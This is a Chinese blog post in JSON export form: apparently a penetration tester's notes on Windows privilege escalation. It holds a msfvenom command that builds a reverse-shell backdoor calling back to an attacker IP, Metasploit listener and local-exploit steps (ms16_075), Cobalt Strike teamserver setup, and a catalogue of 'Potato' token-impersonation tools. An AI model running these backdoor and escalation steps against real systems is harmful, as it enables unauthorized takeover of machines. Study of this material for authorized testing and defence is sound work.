{"title":"权限提升-1","uid":"6da41da59ea2ffb9c7c37f4ee7fbaf75","slug":"权限提升-1","date":"2025-05-31T12:11:29.139Z","updated":"2025-06-01T09:04:58.172Z","comments":true,"path":"api/articles/权限提升-1.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/c160b854-1f3c-4901-9990-093288ad1c04.jpg","content":"<h1 id=\"权限提升-1\"><a href=\"#权限提升-1\" class=\"headerlink\" title=\"权限提升-1\"></a>权限提升-1</h1><p><strong>1、Web语言权限差异</strong><br>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSP等<br>权限高低：JSP&gt;ASP.NET&gt;ASP&#x3D;PHP<br>使用了java搭建的可以不需要提权，而php需要提权</p>\n<p><strong>2、系统用户权限差异</strong><br>Windows：<br>System：系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。<br>Administrators：管理员组，具有对计算机进行完全访问和操作的权限。<br>Users：用户组，一般用户的默认组别，拥有较低的系统权限。<br>Guests：<br>访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。<br>Backup Operators：<br>备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。<br>Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。<br>Remote Desktop Users：远程桌面用户组，允许用户进行远程桌面连接。<br>Network Configuration Operators：网络配置操作员组，允许用户管理网络配置。<br>Performance Log Users：性能日志用户组，允许用户收集性能日志和计数器数据。<br>Distributed COM Users：<br>分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。<br>IIS_IUSRS: 用于授权IIS相关服务的用户组。</p>\n<p>Linux：<br>系统用户：UID(0-999)<br>普通用户：UID(1000-*)<br>root用户：UID为0，拥有系统的完全控制权限</p>\n<h2 id=\"Web到Win-系统提权-MSF-CS\"><a href=\"#Web到Win-系统提权-MSF-CS\" class=\"headerlink\" title=\"Web到Win-系统提权-MSF&amp;CS\"></a>Web到Win-系统提权-MSF&amp;CS</h2><p><strong>msf</strong></p>\n<p>1、生成反弹后门</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.139.141 LPORT=3333 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>\n<p>2、配置监听会话</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 3333</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p>2.1、筛选EXP模块<br>全自动：快速识别系统中可能被利用的漏洞</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">use post/multi/recon/local_exploit_suggester</span><br><span class=\"line\">set showdescription true</span><br></pre></td></tr></table></figure>\n<p>3、利用EXP溢出提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">background</span><br><span class=\"line\">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class=\"line\">set session 1</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p><strong>CS</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod +x ./teamserver</span><br><span class=\"line\">chmod +x ./TeamServerImage</span><br><span class=\"line\">./teamserver IP password</span><br></pre></td></tr></table></figure>\n<p>1,创建CS<br>2，创建监听器<br>3，加载脚本插件</p>\n<p><strong>手动检测工具：</strong></p>\n<p>wes-ng<br><a href=\"https://github.com/bitsadmin/wesng\">https://github.com/bitsadmin/wesng</a></p>\n<p>WES-NG 是一款基于 Windows 实用程序输出的工具systeminfo，它提供操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方法。该工具支持 Windows XP 到 Windows 11 之间的所有 Windows 操作系统，包括其对应的 Windows Server 版本。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install wesng</span><br></pre></td></tr></table></figure>\n<p>或使用以下命令行下载 WES-NG ：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/bitsadmin/wesng --depth 1</span><br></pre></td></tr></table></figure>\n\n<p>执行命令获取最新的漏洞数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wes.py --update</span><br></pre></td></tr></table></figure>\n<p>通过获取对方系统的systeminfo内容，将内容给与wes.py执行查询可能存在的权限提升</p>\n<p><a href=\"https://github.com/Ascotbe/Kernelhub\">https://github.com/Ascotbe/Kernelhub</a><br><a href=\"https://github.com/nomi-sec/PoC-in-GitHub\">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a href=\"https://www.exploit-db.com/\">https://www.exploit-db.com/</a></p>\n<h2 id=\"土豆家族：\"><a href=\"#土豆家族：\" class=\"headerlink\" title=\"土豆家族：\"></a>土豆家族：</h2><p>土豆提权原理:</p>\n<p>  土豆系列提权的核心是NTLM中继，通过欺骗运行在高权限（Administrator&#x2F;SYSTEM）的账户进行ntlm认证，同时作为中间人对认证过程进行劫持和重放，最后调用本地认证接口使用高权限账号的ntml认证获取一个高权限token，只要当前进程拥有SeImpersonatePrivilege权限即可进行令牌模仿，即可取得对应权限。<br><a href=\"https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w\">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p>\n<h3 id=\"GodPotato：\"><a href=\"#GodPotato：\" class=\"headerlink\" title=\"GodPotato：\"></a>GodPotato：</h3><p><a href=\"https://github.com/BeichenDream/GodPotato\">https://github.com/BeichenDream/GodPotato</a></p>\n<p>DCOM rpcss在处理ox时存在一些缺陷，rpcss是系统必须开启的服务，所以它几乎可以运行在任何Windows操作系统上。<br>作用范围：Windows Server 2012 - Windows Server 2022、Windows8 - Windows 11</p>\n<h3 id=\"SweetPotato：\"><a href=\"#SweetPotato：\" class=\"headerlink\" title=\"SweetPotato：\"></a>SweetPotato：</h3><p><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a><br>作用范围：从Windows 7到Windows 10 &#x2F; Server 2019</p>\n<h3 id=\"RoguePotato：\"><a href=\"#RoguePotato：\" class=\"headerlink\" title=\"RoguePotato：\"></a>RoguePotato：</h3><p><a href=\"https://github.com/antonioCoco/RoguePotato\">https://github.com/antonioCoco/RoguePotato</a></p>\n<p>Rogue Potato通过指定远程 IP(攻击者 IP)指示 DCOM 服务器执行远程 OXID 查询在远程 IP 上，设置一个”socat”侦听器，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程；该过程将指向受控命名管道[ncacn_np:localhost&#x2F;pipe&#x2F;roguepotato[pipeepmapper]DCOM 服务器将连接到 RPC 服务器以执行IRemUnkown2接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。</p>\n<p>作用范围：Win 10(部分版本)和Win Server 19</p>\n<h3 id=\"BadPotato：\"><a href=\"#BadPotato：\" class=\"headerlink\" title=\"BadPotato：\"></a>BadPotato：</h3><p><a href=\"https://github.com/BeichenDream/BadPotato\">https://github.com/BeichenDream/BadPotato</a><br>利用了一个打印机bug，通过调用RpcRemoteFindFirstPrinterChangeNotificationEx让打印机服务通过命名管道发送通知，强行使SYSTEM连接到目标命名管道，然后通过如上介绍的方法直接获取到SYSTEM权限<br>作用范围：Windows 2012-2019、Windows 8-10</p>\n<h3 id=\"EfsPotato：\"><a href=\"#EfsPotato：\" class=\"headerlink\" title=\"EfsPotato：\"></a>EfsPotato：</h3><p><a href=\"https://github.com/zcgonvh/EfsPotato\">https://github.com/zcgonvh/EfsPotato</a><br>利用MS-EFSR EfsRpcEncryptFileSrv带有 SeImpersonatePrivilege 本地权限升级漏洞<br>作用范围：未知</p>\n<h3 id=\"MultiPotato：\"><a href=\"#MultiPotato：\" class=\"headerlink\" title=\"MultiPotato：\"></a>MultiPotato：</h3><p><a href=\"https://github.com/S3cur3Th1sSh1t/MultiPotato\">https://github.com/S3cur3Th1sSh1t/MultiPotato</a><br>作用范围：未知</p>\n<h3 id=\"CandyPotato：\"><a href=\"#CandyPotato：\" class=\"headerlink\" title=\"CandyPotato：\"></a>CandyPotato：</h3><p><a href=\"https://github.com/klezVirus/CandyPotato\">https://github.com/klezVirus/CandyPotato</a><br>0.2 版JuicyPotato。与0.1版本（JuicyPotato）相比，该版本提供了一些改进，例如自动化利用。</p>\n<p>作用范围：win10和server2016</p>\n<h3 id=\"RasmanPotato\"><a href=\"#RasmanPotato\" class=\"headerlink\" title=\"RasmanPotato:\"></a>RasmanPotato:</h3><p><a href=\"https://github.com/crisprss/RasmanPotato\">https://github.com/crisprss/RasmanPotato</a><br>只是另一个土豆，就像其他土豆一样，使用 RasMan 服务进行权限升级</p>\n<p>作用范围：Windows 10(11 not test), Windows Server 2012 - 2019(2022 not test)</p>\n<h3 id=\"PetitPotato\"><a href=\"#PetitPotato\" class=\"headerlink\" title=\"PetitPotato:\"></a>PetitPotato:</h3><p><a href=\"https://github.com/wh0amitz/PetitPotato\">https://github.com/wh0amitz/PetitPotato</a><br>通过 PetitPotam 进行本地权限升级（滥用模拟权限）。<br>作用范围：未知</p>\n<h3 id=\"JuicyPotatoNG\"><a href=\"#JuicyPotatoNG\" class=\"headerlink\" title=\"JuicyPotatoNG:\"></a>JuicyPotatoNG:</h3><p><a href=\"https://github.com/antonioCoco/JuicyPotatoNG\">https://github.com/antonioCoco/JuicyPotatoNG</a><br>利用PrintNotify COM服务进行提权。</p>\n<p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p>\n<h3 id=\"PrintNotifyPotato\"><a href=\"#PrintNotifyPotato\" class=\"headerlink\" title=\"PrintNotifyPotato:\"></a>PrintNotifyPotato:</h3><p><a href=\"https://github.com/BeichenDream/PrintNotifyPotato\">https://github.com/BeichenDream/PrintNotifyPotato</a><br>原理：又一个土豆，利用PrintNotify COM服务进行提权，跟JuicyPotatoNG实现相同，只不过JuicyPotatoNG是用c++实现的，而PrintNotifyPotato是用c#实现的。</p>\n<p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p>\n<h3 id=\"CoercedPotato\"><a href=\"#CoercedPotato\" class=\"headerlink\" title=\"CoercedPotato:\"></a>CoercedPotato:</h3><p><a href=\"https://github.com/Prepouce/CoercedPotato\">https://github.com/Prepouce/CoercedPotato</a><br>在 Windows 10、Windows 11 和 Server 2022 上通过滥用 SeImpersonatePrivilege 从 Patate（本地&#x2F;网络服务）到 SYSTEM。</p>\n<p>作用范围：Windows 10 - 11 Windows Server 2012 - 2022</p>\n","text":"权限提升-11、Web语言权限差异ASP/ASP.NET/PHP/JSP等权限高低：JSP>ASP.NET>ASP=PHP使用了java搭建的可以不需要提权，而...","permalink":"/post/权限提升-1","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/tags/权限提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1\"><span class=\"toc-text\">权限提升-1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-MSF-CS\"><span class=\"toc-text\">Web到Win-系统提权-MSF&amp;CS</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F%EF%BC%9A\"><span class=\"toc-text\">土豆家族：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GodPotato%EF%BC%9A\"><span class=\"toc-text\">GodPotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SweetPotato%EF%BC%9A\"><span class=\"toc-text\">SweetPotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RoguePotato%EF%BC%9A\"><span class=\"toc-text\">RoguePotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#BadPotato%EF%BC%9A\"><span class=\"toc-text\">BadPotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EfsPotato%EF%BC%9A\"><span class=\"toc-text\">EfsPotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#MultiPotato%EF%BC%9A\"><span class=\"toc-text\">MultiPotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CandyPotato%EF%BC%9A\"><span class=\"toc-text\">CandyPotato：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RasmanPotato\"><span class=\"toc-text\">RasmanPotato:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PetitPotato\"><span class=\"toc-text\">PetitPotato:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#JuicyPotatoNG\"><span class=\"toc-text\">JuicyPotatoNG:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PrintNotifyPotato\"><span class=\"toc-text\">PrintNotifyPotato:</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CoercedPotato\"><span class=\"toc-text\">CoercedPotato:</span></a></li></ol></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"权限提升-2","uid":"0f8abd92b0e73165bbd05c82bb1708c5","slug":"权限提升-2","date":"2025-06-01T09:03:06.779Z","updated":"2025-06-01T16:52:07.344Z","comments":true,"path":"api/articles/权限提升-2.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/c41ba1b1-fb0a-4372-b48a-06427e3a6734.jpg","text":"权限提升-2数据库提权数据库提权流程： 1、先获取到数据库用户密码 网站存在SQL注入漏洞 数据库的存储文件或备份文件 网站应用源码中的数据库配置文件 采用工具...","permalink":"/post/权限提升-2","photos":[],"count_time":{"symbolsCount":"1.9k","symbolsTime":"2 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/tags/权限提升.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}},"next_post":{"title":"PHP-代码审计-1","uid":"acb54170ac17da99f77fb481ec7f7fa5","slug":"PHP代码审计","date":"2025-05-22T09:23:12.983Z","updated":"2025-05-22T10:03:14.425Z","comments":true,"path":"api/articles/PHP代码审计.json","cover":null,"text":"PHP-代码审计-1关于SQL的审计：挖掘技巧： 语句监控-数据库SQL监控排查可利用语句定向分析 功能追踪-功能点文件SQL执行代码函数调用链追踪 正则搜索-...","permalink":"/post/PHP代码审计","photos":[],"count_time":{"symbolsCount":177,"symbolsTime":"1 mins."},"categories":[{"name":"PHP代码审计","slug":"PHP代码审计","count":1,"path":"api/categories/PHP代码审计.json"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","count":1,"path":"api/tags/PHP代码审计.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}